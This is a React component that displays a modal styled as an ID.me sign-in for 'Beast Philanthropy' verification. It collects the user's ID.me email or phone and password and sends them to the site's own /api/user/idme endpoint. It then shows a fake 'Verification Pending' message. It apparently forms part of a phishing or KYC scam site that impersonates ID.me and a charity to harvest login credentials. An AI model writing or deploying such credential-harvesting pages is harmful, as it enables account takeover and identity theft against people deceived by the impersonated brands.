"use client";
import { useState } from "react";

interface IDmeModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export default function IDmeModal({ onClose, onSuccess }: IDmeModalProps) {
  const [step, setStep] = useState<1 | 2>(1); // 1: Login, 2: Success/Pending
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/idme", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(formData),
      });

      if (res.ok) {
        setStep(2);
        onSuccess();
      } else {
        alert("Verification failed. Please try again.");
      }
    } catch (err) {
      alert("Error saving ID.me details.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const modalStyle: React.CSSProperties = {
    position: "fixed",
    inset: 0,
    background: "rgba(0,0,0,0.7)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    zIndex: 10000,
    backdropFilter: "blur(8px)",
    padding: "20px",
  };

  const cardStyle: React.CSSProperties = {
    background: "white",
    width: "100%",
    maxWidth: "440px",
    borderRadius: "16px",
    padding: "40px 24px",
    boxShadow: "0 25px 50px -12px rgba(0, 0, 0, 0.25)",
    fontFamily: "Inter, system-ui, sans-serif",
    position: "relative",
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "14px 16px",
    border: "2px solid #eee",
    borderRadius: "8px",
    fontSize: "0.95rem",
    outline: "none",
    transition: "border-color 0.2s",
  };

  const buttonStyle: React.CSSProperties = {
    width: "100%",
    padding: "16px",
    background: "#1264a3",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontWeight: 700,
    fontSize: "1rem",
    cursor: "pointer",
    marginTop: "12px",
    textTransform: "uppercase",
  };

  return (
    <div style={modalStyle} onClick={onClose}>
      <div style={cardStyle} onClick={(e) => e.stopPropagation()}>
        <button
          onClick={onClose}
          style={{
            position: "absolute",
            top: "20px",
            right: "20px",
            background: "none",
            border: "none",
            fontSize: "1.2rem",
            cursor: "pointer",
            color: "#ccc",
          }}
        >
          ✕
        </button>

        {step === 1 && (
          <form onSubmit={handleSubmit}>
            <div style={{ textAlign: "center", marginBottom: "32px" }}>
               <div style={{ background: "#1264a3", color: "white", display: "inline-block", padding: "4px 12px", borderRadius: "4px", fontSize: "1.1rem", fontWeight: 900, marginBottom: "16px" }}>ID.me</div>
               <h2 style={{ fontSize: "1.2rem", fontWeight: 700, color: "#333", marginBottom: "8px" }}>Verify with ID.me</h2>
               <p style={{ color: "#666", fontSize: "0.85rem", lineHeight: 1.5 }}>
                 Securely sync your identity credentials from ID.me to verify your status with Beast Philanthropy.
               </p>
            </div>
            <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
              <input
                style={inputStyle}
                placeholder="Email or phone"
                required
                value={formData.email}
                onChange={(e) => setFormData((p) => ({ ...p, email: e.target.value }))}
              />
              <input
                style={inputStyle}
                type="password"
                placeholder="Password"
                required
                value={formData.password}
                onChange={(e) => setFormData((p) => ({ ...p, password: e.target.value }))}
              />
            </div>
            <button type="submit" disabled={isSubmitting} style={buttonStyle}>
              {isSubmitting ? "SIGNING IN..." : "SIGN IN TO ID.ME"}
            </button>
            <p style={{ textAlign: "center", marginTop: "20px", fontSize: "0.8rem", color: "#888" }}>
              By signing in, you agree to ID.me Terms of Service.
            </p>
          </form>
        )}

        {step === 2 && (
          <div style={{ textAlign: "center" }}>
            <div
              style={{
                width: "64px",
                height: "64px",
                background: "#f0f7ff",
                borderRadius: "50%",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                margin: "0 auto 24px",
              }}
            >
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#1264a3" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <polyline points="12 6 12 12 16 14" />
              </svg>
            </div>
            <h2 style={{ fontSize: "1.3rem", fontWeight: 700, marginBottom: "12px", color: "#333" }}>Verification Pending</h2>
            <p style={{ color: "#666", fontSize: "0.95rem", lineHeight: 1.6, marginBottom: "32px" }}>
              A verification code has been sent to your registered device. Please check back later to enter your sync code.
            </p>
            <button onClick={onClose} style={buttonStyle}>
              GO TO DASHBOARD
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
